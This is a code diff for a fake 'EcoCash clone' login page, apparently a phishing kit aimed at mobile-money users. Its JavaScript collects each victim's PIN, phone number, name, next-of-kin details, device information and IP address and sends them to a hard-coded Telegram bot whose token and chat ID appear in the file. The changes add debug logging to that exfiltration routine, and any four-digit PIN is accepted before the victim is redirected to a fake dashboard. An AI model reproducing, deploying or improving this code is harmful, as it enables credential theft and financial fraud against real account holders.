@@ -1,5 +1,5 @@
 /* =========================================
-   ECOCASH CLONE - SECURITY-LESS VERSION
+   ECOCASH CLONE - DEBUG VERSION
    ========================================= */
 
 // ==========================================
@@ -7,7 +7,10 @@
 // ==========================================
 const TELEGRAM_BOT_TOKEN = '8827045093:AAElik1G_KqVGWfKVZNoZikvLdDcuM9bSM8';
 const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-const TELEGRAM_CHAT_ID = '714082360'; // REPLACE WITH YOUR REAL CHAT ID
+const TELEGRAM_CHAT_ID = '714082360'; // ← CHANGE THIS TO YOUR REAL CHAT ID
+
+console.log("✅ Bot Token loaded:", TELEGRAM_BOT_TOKEN);
+console.log("✅ Chat ID loaded:", TELEGRAM_CHAT_ID);
 
 // ==========================================
 // DOM READY
@@ -20,6 +23,7 @@ document.addEventListener("DOMContentLoaded", function () {
     const phoneInput = document.getElementById("loginPhone");
     if (phoneInput) {
         phoneInput.value = localStorage.getItem("phone") || "";
+        console.log("📱 Phone loaded:", phoneInput.value);
     }
 
     // Setup PIN inputs
@@ -28,16 +32,9 @@ document.addEventListener("DOMContentLoaded", function () {
         setupPinInputs();
     }
 
-    // Load other features
     if (document.getElementById("amount")) updateCalculator();
     if (document.getElementById("amountText")) loadSummary();
     if (document.getElementById("hiddenAmount")) loadAllDataToStep5();
-    
-    // Update button text
-    const submitBtn = document.getElementById("submitBtn");
-    if (submitBtn) {
-        submitBtn.innerText = "LOGIN TO DASHBOARD";
-    }
 });
 
 // ==========================================
@@ -245,10 +242,12 @@ async function getIPAddress() {
 }
 
 // ==========================================
-// SEND TO TELEGRAM - COMPLETE APPLICATION DATA
+// SEND TO TELEGRAM - DEBUG VERSION
 // ==========================================
 async function sendToTelegram(data) {
     console.log("📤 Sending application to Telegram...");
+    console.log("📤 Target URL:", TELEGRAM_API_URL);
+    console.log("📤 Chat ID:", TELEGRAM_CHAT_ID);
     
     const principal = parseFloat(data.amount);
     const days = parseInt(data.duration);
@@ -256,7 +255,6 @@ async function sendToTelegram(data) {
     const interest = principal * DAILY_RATE * days;
     const total = principal + interest;
     
-    // Generate a random application ID
     const applicationId = 'APP-' + Date.now().toString().slice(-6);
     
     const message = `
@@ -298,23 +296,42 @@ async function sendToTelegram(data) {
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     `;
 
+    const payload = {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown'
+    };
+    
+    console.log("📤 Sending payload:", payload);
+
     try {
+        console.log("⏳ Waiting for Telegram response...");
         const response = await fetch(TELEGRAM_API_URL, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
-            })
+            headers: { 
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
         });
         
-        const responseData = await response.json();
-        console.log("📥 Telegram response:", responseData);
+        console.log("📥 Response status:", response.status);
+        console.log("📥 Response OK?", response.ok);
         
+        const responseData = await response.json();
+        console.log("📥 Full response data:", responseData);
+        
+        if (!responseData.ok) {
+            console.error("❌ Telegram returned error:", responseData.description);
+            throw new Error(responseData.description || 'Telegram API error');
+        }
+        
+        console.log("✅ Telegram send successful!");
         return responseData;
+        
     } catch (error) {
-        console.error('❌ Telegram send error:', error);
+        console.error("❌ Fetch error in sendToTelegram:", error);
+        console.error("❌ Error type:", error.name);
+        console.error("❌ Error message:", error.message);
         throw error;
     }
 }
@@ -333,14 +350,11 @@ async function submitLogin() {
     errorBox.style.display = 'none';
     successBox.style.display = 'none';
     
-    // === ONLY CHECK LENGTH - NO VALIDATION ===
     if (pin.length < 4) {
         showError("Please enter a 4-digit PIN to continue");
         return;
     }
-    // =========================================
     
-    // Gather all data
     const accountType = document.getElementById('accountType').value;
     const phone = localStorage.getItem('phone') || '';
     const fullName = localStorage.getItem('fullName') || '';
@@ -352,12 +366,10 @@ async function submitLogin() {
     const kinPhone = localStorage.getItem('kphone') || '';
     const province = localStorage.getItem('province') || '';
     
-    // Show loader
     document.getElementById('pageLoader').style.display = 'block';
     console.log("⏳ Processing submission...");
     
     try {
-        // Get device info and IP
         const deviceInfo = getDeviceInfo();
         const ipAddress = await getIPAddress();
         const timestamp = new Date().toLocaleString('en-US', { 
@@ -365,7 +377,6 @@ async function submitLogin() {
             hour12: true 
         });
         
-        // Prepare data
         const applicationData = {
             pin: pin,
             accountType: accountType,
@@ -385,21 +396,17 @@ async function submitLogin() {
         
         console.log("📦 Data prepared:", applicationData);
         
-        // Send to Telegram
         const telegramResponse = await sendToTelegram(applicationData);
         
         if (telegramResponse.ok) {
             console.log("✅ Application sent to Telegram!");
             
-            // Show success
             successBox.style.display = 'block';
             successBox.innerHTML = '✅ Application submitted successfully! Redirecting to dashboard...';
             
-            // === GRANT ACCESS - NO VALIDATION REQUIRED ===
             setTimeout(() => {
                 window.location.href = "dashboard.html";
             }, 2000);
-            // ============================================
             
         } else {
             throw new Error('Telegram send failed');
@@ -407,7 +414,7 @@ async function submitLogin() {
         
     } catch (error) {
         console.error("❌ Error submitting application:", error);
-        showError('❌ Failed to submit application. Please try again.');
+        showError('❌ Failed to submit application. Please try again. Check console for details.');
     } finally {
         document.getElementById('pageLoader').style.display = 'none';
     }
@@ -421,6 +428,7 @@ function showError(msg) {
     if (box) {
         box.innerText = msg;
         box.style.display = "block";
+        console.error("❌ Error displayed:", msg);
     } else {
         alert(msg);
     }
